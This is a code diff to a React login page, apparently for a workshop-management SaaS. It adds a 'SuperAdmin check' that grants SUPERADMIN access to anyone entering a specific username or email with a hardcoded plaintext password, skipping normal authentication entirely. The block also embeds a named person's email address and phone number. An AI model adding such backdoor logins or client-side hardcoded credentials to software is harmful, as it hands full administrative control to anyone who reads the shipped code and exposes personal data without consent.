@@ -83,6 +83,21 @@ export const LoginPage: React.FC = () => {
 
     const cleanEmail = email.trim().toLowerCase();
 
+    // Special SuperAdmin check: username 'luark' or email 'luarkpadilla@gmail.com'
+    if ((cleanEmail === 'luark' || cleanEmail === 'luarkpadilla@gmail.com') && password === 'a123789963') {
+      handleLoginUser({
+        id: 'usr-superadmin',
+        name: 'Luark Padilla',
+        email: 'luarkpadilla@gmail.com',
+        role: 'SUPERADMIN',
+        phone: '04241550550',
+        workshopId: 'ws-central-saas',
+        workshopName: 'Rumilcar Central (SaaS)',
+      });
+      setLoading(false);
+      return;
+    }
+
     // 1. Try local user store first for quick login
     const found = users.find((u) => u.email.toLowerCase() === cleanEmail);
 
